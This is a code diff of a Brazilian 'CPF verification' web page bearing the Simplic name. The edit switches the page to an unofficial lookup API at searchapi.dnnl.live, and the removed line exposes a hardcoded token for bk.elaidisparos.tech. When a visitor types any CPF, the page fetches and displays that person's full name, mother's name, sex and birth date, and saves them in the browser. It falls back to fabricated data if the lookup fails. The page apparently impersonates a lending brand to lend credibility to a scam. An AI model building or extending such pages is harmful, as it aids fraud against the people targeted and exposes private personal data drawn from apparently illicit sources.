@@ -1,10 +1,11 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Simplic - Verificação de CPF</title>
     <link href="css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="css/style.css">
-    
 </head>
 <body>
     <header class="header">
@@ -115,7 +116,7 @@
 
     <script src="js/bootstrap.bundle.min.js"></script>
     <script src="js/all.min.js"></script>
-      <script>
+    <script>
         function showNotification(message) {
             const notification = document.getElementById('notification');
             const notificationMessage = document.getElementById('notification-message');
@@ -145,7 +146,7 @@
             
             e.target.value = value;
             
-            // Salvar o CPF sem formataão no localStorage sempre que o usuário digitar
+            // Salvar o CPF sem formatação no localStorage sempre que o usuário digitar
             const cpfRaw = value.replace(/\D/g, '');
             if (cpfRaw.length === 11) {
                 localStorage.setItem('cpfUsuario', cpfRaw);
@@ -172,9 +173,9 @@
             }
 
             try {
-                console.log('Iniciando consulta  API...');
-                const url = `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=927492e7841e779b2d605b6309d11c5a463b6c2b89a8fb692cc0496928c5171f`;
-                console.log('URL da requisião:', url);
+                console.log('Iniciando consulta API...');
+                const url = `https://searchapi.dnnl.live/consulta?token_api=5145&cpf=${cpf}`;
+                console.log('URL da requisição:', url);
 
                 const response = await fetch(url, {
                     method: 'GET',
@@ -185,28 +186,38 @@
                 const data = await response.json();
                 console.log('Dados recebidos:', data);
 
-                if (response.ok) {
-                    console.log('Consulta bem sucedida');
+                // ===== INÍCIO DO AJUSTE =====
+                // Verificamos se a resposta foi OK (200) E se o array 'dados' existe e tem itens
+                if (response.ok && data.dados && data.dados.length > 0) {
+                    console.log('Consulta bem sucedida e dados encontrados');
                     
+                    // Pegamos o primeiro objeto de dentro do array 'dados'
+                    const apiData = data.dados[0];
+                    
+                    // Criamos o objeto 'dadosUsuario' com os campos corretos (em maiúsculo, como a API envia)
                     const dadosUsuario = {
-                        NOME: data.nome,
-                        MAE: data.mae || '',
-                        SEXO: data.sexo,
-                        NASCIMENTO: data.nascimento
+                        NOME: apiData.NOME,
+                        MAE: apiData.NOME_MAE || '', // Usando NOME_MAE
+                        SEXO: apiData.SEXO,
+                        NASCIMENTO: apiData.NASC // Usando NASC
                     };
                     
                     localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
                     
                     console.log('Dados salvos no localStorage');
 
+                    // Exibimos os dados corretos na tela
                     document.getElementById('user-name').textContent = dadosUsuario.NOME;
-                    document.getElementById('user-cpf').textContent = data.cpfformatado || cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+                    // Tentamos usar o CPF formatado da API, se não existir, formatamos o que o usuário digitou
+                    document.getElementById('user-cpf').textContent = (apiData.CPF ? apiData.CPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"));
                     
                     document.getElementById('verification-step').style.display = 'none';
                     document.getElementById('results-step').style.display = 'block';
                     console.log('Tela de resultados exibida com sucesso');
+                // ===== FIM DO AJUSTE =====
                 } else {
-                    console.log('CPF não encontrado. Status:', response.status);
+                    // Isso agora trata CPFs não encontrados ou respostas sem o array 'dados'
+                    console.log('CPF não encontrado ou dados inválidos. Status:', response.status);
                     showNotification('CPF não encontrado');
                     verifyButton.innerHTML = 'Verificar';
                 }
@@ -214,6 +225,7 @@
                 console.error('Erro detalhado:', error);
                 console.error('Stack trace:', error.stack);
                 
+                // Mantive os dados simulados aqui caso a API falhe por outro motivo (ex: CORS, fora do ar)
                 console.log('Usando dados simulados devido ao erro');
                 const dadosUsuario = {
                     NOME: "GHERSON DYWYNO ESPHYNDOLA",
@@ -283,4 +295,5 @@
         });
     </script>
 
- </body></html>
+</body>
+</html>
